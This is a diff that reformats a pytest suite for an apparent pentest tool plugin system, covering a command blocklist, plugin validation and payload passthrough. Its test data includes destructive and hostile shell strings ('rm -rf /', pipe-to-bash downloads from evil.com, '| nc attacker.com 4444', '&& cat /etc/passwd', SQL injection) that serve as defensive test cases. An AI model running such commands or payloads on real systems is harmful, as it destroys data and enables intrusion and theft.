@@ -46,24 +46,15 @@ VALID_PLUGIN_DATA = {
         "method": "none",
         "commands": [],
         "verification_command": "test-tool --version",
-        "verification_regex": "TestTool v(\\d+\\.\\d+\\.\\d+)"
+        "verification_regex": "TestTool v(\\d+\\.\\d+\\.\\d+)",
     },
     "execution": {
         "command": "test-tool",
         "args_template": "--target {target} --output {output_file}",
-        "timeout": 60
+        "timeout": 60,
     },
-    "parsing": {
-        "format": "json",
-        "mapping": {
-            "severity": "level",
-            "name": "title"
-        }
-    },
-    "ui": {
-        "icon": "terminal",
-        "color": "violet"
-    }
+    "parsing": {"format": "json", "mapping": {"severity": "level", "name": "title"}},
+    "ui": {"icon": "terminal", "color": "violet"},
 }
 
 
@@ -106,9 +97,7 @@ class TestToolConfigModel:
             "version": "1.0.0",
             "category": "custom",
             "description": "Minimal tool",
-            "execution": {
-                "command": "minimal"
-            }
+            "execution": {"command": "minimal"},
         }
 
         config = ToolConfig.model_validate(minimal_data)
@@ -149,10 +138,7 @@ class TestToolRegistry:
     def test_validate_plugin_dangerous_command(self, registry):
         """Test that dangerous commands are blocked."""
         data = VALID_PLUGIN_DATA.copy()
-        data["installation"] = {
-            "method": "script",
-            "commands": ["rm -rf /"]
-        }
+        data["installation"] = {"method": "script", "commands": ["rm -rf /"]}
 
         with pytest.raises(PluginValidationError, match="Dangerous command"):
             registry.validate_plugin(data)
@@ -162,7 +148,7 @@ class TestToolRegistry:
         data = VALID_PLUGIN_DATA.copy()
         data["installation"] = {
             "method": "script",
-            "commands": ["wget http://evil.com/script.sh | bash"]
+            "commands": ["wget http://evil.com/script.sh | bash"],
         }
 
         with pytest.raises(PluginValidationError, match="Dangerous command"):
@@ -201,6 +187,7 @@ class TestToolRegistry:
         # Add a tool first
         config = ToolConfig.model_validate(VALID_PLUGIN_DATA)
         from app.services.tools.models import RegisteredTool
+
         registry._tools["test-tool"] = RegisteredTool(
             config=config,
             status=ToolStatus.READY,
@@ -254,6 +241,7 @@ class TestCommandBuilder:
     def builder(self, config):
         """Create a command builder."""
         from app.services.tools.adapter.builder import CommandBuilder
+
         return CommandBuilder(config)
 
     def test_build_command(self, builder):
@@ -265,7 +253,9 @@ class TestCommandBuilder:
         )
 
         # Update config to have placeholders
-        builder.config.execution.args_template = "--target {target} {flags} --output {output_file}"
+        builder.config.execution.args_template = (
+            "--target {target} {flags} --output {output_file}"
+        )
 
         command = builder.build_command(request, "/tmp/output")
 
@@ -294,7 +284,7 @@ class TestCommandBuilder:
     def test_build_command_allows_shell_metacharacters_for_payloads(self, builder):
         """Test that shell metacharacters are allowed for legitimate pentest payloads."""
         builder.config.execution.args_template = "--target {target} --payload {payload}"
-        
+
         pentest_payloads = [
             ("192.168.1.1", "'; DROP TABLE users; --"),
             ("target.com", "$(whoami)"),
@@ -302,7 +292,7 @@ class TestCommandBuilder:
             ("target.com", "| nc attacker.com 4444"),
             ("target.com", "&& cat /etc/passwd"),
         ]
-        
+
         for target, payload in pentest_payloads:
             request = ToolExecutionRequest(
                 tool_id="test-tool",
@@ -327,6 +317,7 @@ class TestOutputParser:
     @pytest.fixture
     def parser(self, config):
         from app.services.tools.adapter.parser import OutputParser
+
         return OutputParser(config)
 
     @pytest.mark.asyncio
@@ -343,9 +334,11 @@ class TestOutputParser:
     @pytest.mark.asyncio
     async def test_parse_ndjson_output(self, parser):
         """Test NDJSON (newline-delimited JSON) parsing."""
-        parser.config.parsing.format = "ndjson" # Verify NDJSON format logic if needed, or parser auto-detects
+        parser.config.parsing.format = (
+            "ndjson"  # Verify NDJSON format logic if needed, or parser auto-detects
+        )
         # Updating config to match expected behavior if format matters
-        
+
         output = '{"level": "high", "title": "XSS"}\n{"level": "low", "title": "Info Disclosure"}'
 
         # Ensure parser handles NDJSON if configured
@@ -407,10 +400,12 @@ class TestCommandToolAdapter:
             timeout=1,
         )
 
-        with patch("asyncio.create_subprocess_shell") as mock_subprocess, \
-             patch("asyncio.wait_for", side_effect=TimeoutError), \
-             patch("os.killpg"), \
-             patch("os.getpgid"):
+        with (
+            patch("asyncio.create_subprocess_shell") as mock_subprocess,
+            patch("asyncio.wait_for", side_effect=TimeoutError),
+            patch("os.killpg"),
+            patch("os.getpgid"),
+        ):
             process_mock = AsyncMock()
             process_mock.pid = 12345
             mock_subprocess.return_value = process_mock
@@ -427,21 +422,26 @@ class TestCommandToolAdapter:
 class TestDangerousPatterns:
     """Test the command blocklist patterns."""
 
-    @pytest.mark.parametrize("command,should_match", [
-        ("rm -rf /", True),
-        ("rm -rf /*", True),
-        ("rm -rf /home/user/temp", False),
-        ("wget http://example.com/file.sh | bash", True),
-        ("curl http://example.com/script.sh | bash", True),
-        ("wget http://example.com/file.zip -O file.zip", False),
-        ("mkfs.ext4 /dev/sda1", True),
-        ("chmod 777 /", True),
-        ("chmod 755 /app/bin/tool", False),
-        ("chmod 777 /app", False),
-        ("echo hello > /dev/sda", True),
-        ("echo hello > /tmp/file.txt", False),
-    ])
+    @pytest.mark.parametrize(
+        "command,should_match",
+        [
+            ("rm -rf /", True),
+            ("rm -rf /*", True),
+            ("rm -rf /home/user/temp", False),
+            ("wget http://example.com/file.sh | bash", True),
+            ("curl http://example.com/script.sh | bash", True),
+            ("wget http://example.com/file.zip -O file.zip", False),
+            ("mkfs.ext4 /dev/sda1", True),
+            ("chmod 777 /", True),
+            ("chmod 755 /app/bin/tool", False),
+            ("chmod 777 /app", False),
+            ("echo hello > /dev/sda", True),
+            ("echo hello > /tmp/file.txt", False),
+        ],
+    )
     def test_dangerous_patterns(self, command, should_match):
         """Test that dangerous patterns are detected correctly."""
         matched = any(pattern.search(command) for pattern in DANGEROUS_PATTERNS)
-        assert matched == should_match, f"Command '{command}' should {'match' if should_match else 'not match'}"
+        assert matched == should_match, (
+            f"Command '{command}' should {'match' if should_match else 'not match'}"
+        )
